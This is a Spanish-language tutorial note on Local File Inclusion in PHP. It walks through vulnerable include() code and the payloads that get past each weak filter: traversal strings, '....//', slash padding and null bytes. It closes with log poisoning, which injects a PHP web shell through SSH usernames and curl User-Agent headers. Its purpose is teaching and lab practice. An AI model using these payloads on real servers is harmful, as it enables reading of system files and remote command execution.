----
- Tags: #basico #ataques #teoria #practica 
---

# ¿ Que es un **LFI** ?

### El **LFI** es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecauadamente** las entradas del usuario, permitiendo a un atacante **acceder a archvios locales** en el servidor web.

### Muchas veces, los atacantes aprovechas el **FLI** al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitires acceder a archivos en el servidor web. Esta técnica se conoce como **"Path Traversal"** y se utiliza comúnmente en ataques de **LFI**.

---

# Explotación 

### Para enumerar los posibles **LFI** y su respectiva explotación lo vamos a hacer de manera local junto a un archivo php para levantar nuestro servicio de apache, de esta manera, podemos ver como un desarrollador podria encarar el intento de **LFI** asi como **burlarlo**. 

#### Archivo index.php
```php
	$filename = $_GET['file'];
	include($filename); 
```

### Esto seria la **LFI** más basica, ya que directamente es confia en el input del usuario, donde se lee una query de la url con nombre file para incluirla a invel de sistema. Con poner en la url `....?file=/etc/passwd` estariamos leyendo archivos locales del sistema.

#### Intento triste de sanitización
```php
	$filename = $_GET['file'];
	include("/var/www/html" . $filename);
```

### Este "intento" de sanitización intenta obligar al usuario a introducir un arhivo de manera que se lo concatena con la ruta /var/www/html intentando obligar asi a que el archivo se encuentre en esta ruta, pero burlarlo, una vez más es posible, ya que jugando con **Path Traversal** se puede realizar ingresando en la url                                `...?file=../../../../../../../etc/passwd` estariamos volviendo a leer archivos locales del sistema.

#### Segundo intento de sanitización 
```php
	$filename = $_GET['file'];
	$filename = str_replace("../", "", $filename);
	include($filename); 
```

### En este nuevo intento, el desarrollador podria estar intentando evitar un **Path Traversal** de manera que intenta remplazar los valores `../` por `''` , es decir que esta eliminando de nuestro input los ../, pero, una vez más esto sigue siendo vulnerable, ya que este remplazo no es de manera recursiva, por lo que si ahora ingresamos en la url el valor de `...?file=....//....//....//....//....//....//....//....//....//....//etc/passwd` estariamos una vez más volviendo a leer archivos locales del sistema.

#### Jugando con regex
```php
	$filename = $_GET['file'];
	$filename = str_replace("../", "", $filename);
	if ( preg_match("/\/etc\/passwd/", $filename) === 1){
    echo "\n[!] No es posible visualizar el contenido de este archivo.\n"; 
	}else{  
    include("/var/www/html/" . $filename);
	}
	```

### En este caso, no solo esta intentando evitar un **Path Traversal** como anteriormente si no que tambien esta jugando con regex para evitar la string `/etc/passwd`, pero esto sigue siendo vulnerable, no solo por el hecho de que jugando con `....//` se puede listar cualquier archivo, si no que tambien, podriamos listar el etc/passwd ya que la regex filtra por exctamente /etc/passwd por lo que podriamos ingrear `/etc/////./././///////passwd` y seguiriamos pudiendo listar este y cualquier archivo local del sistema.  (Se pueden ingresar cuantas barras '/' y puntos '.' querramos.)

### Tambien a nivel de sistema, cuando usamos el `?` se pueden buscar archivos, por ejemplo `cat /e?c/pa??wd`. 

#### Forzando extensiones de archvios
```php
$filename = $_GET['file'];
	$filename = str_replace("../", "", $filename);
	include("/var/www/html/" . $filename . ".php"); 
```

### En este caso el desarrollador estaria intentando forzarnos a que lo que ingresemos tenga la extención .php, por lo que si quisieramos ingresar /etc/passwd estariamos ingresando /etc/passwd.php (En caso de sortear todo tipo de validación posible). En este caso, lo que podriamos hacer es hacer uso de un **NULL Byte**, es importante aclarar que esto funciona para versiones antiguas de php y no actuales. Solo haria falta poner en la url 
### `...?file=....//....//....//....//....//....//....//....//....//etc/passwd%00`, el **%00** es un null Byte, lo cual anula lo posterior al mismo, anulando asi la extención '.php'. 

### Tambien si se hiciera una validación tal que  `if(substr($argv[1],-6,6)!="passwd") include($argv[1]);` asi, en donde se evalua que los ultimos 6 caracteres no sean "passwd", para versiones antiguas de php, podriamos utilizar el `/.` para burlar esto, de manera que si ingresamos `/etc/passwd/.` estariamos burlando la validación. Lo mismo que si se utilizara lo mismo para validar extenciones, por ejemplo`if(substr($argv[1],-4,4)!=".txt") include($argv[1]);`, de esta manera no podriamos ver  archivos .txt, pero si hicieramos `file.txt/.` una vez más, estariamos burlando esto. 

----

#  Log Poisoning - ( **LFI** migrado a [[RCE - (Remote Command Execution)]] )

### El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro (logs)** de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** para lograr un [[RCE - (Remote Command Execution)]].  

### Esto se puede dar abusando de los archivos de logs de ssh, Mail, Apache, etc.

- ## SSH 
### Podriamos desde un **LFI** ver la ruta `/var/log/auth.log` o `/var/log/btmp`, entre otras, para ver los logs de SSH, y de esta manera, en caso de que los podamos ver, envenenar el log (**Log Poisoning**) intentando conectarnos a ssh por ejemplo con el comando `ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.38`. 

- ## Apache 
### Podriamos desde un **LFI** ver la ruta `/var/log/apache2/access.log`, entre otras, para ver los logs de Apache, y de esta manera, en caso de que los podamos ver, envenenear el log (**Log Poisoning**) intentando hacer un curl a la ruta y inyectando el comando php en el User-Agent con el comando `curl -s -X GET 'http://192.168.1.38' -d 'User-Agent: <?php system($_GET["cmd"]); ?>'` o con 
### `curl -s -X GET 'http://192.168.1.38' -A '<?php system("whoami"); ?>'`

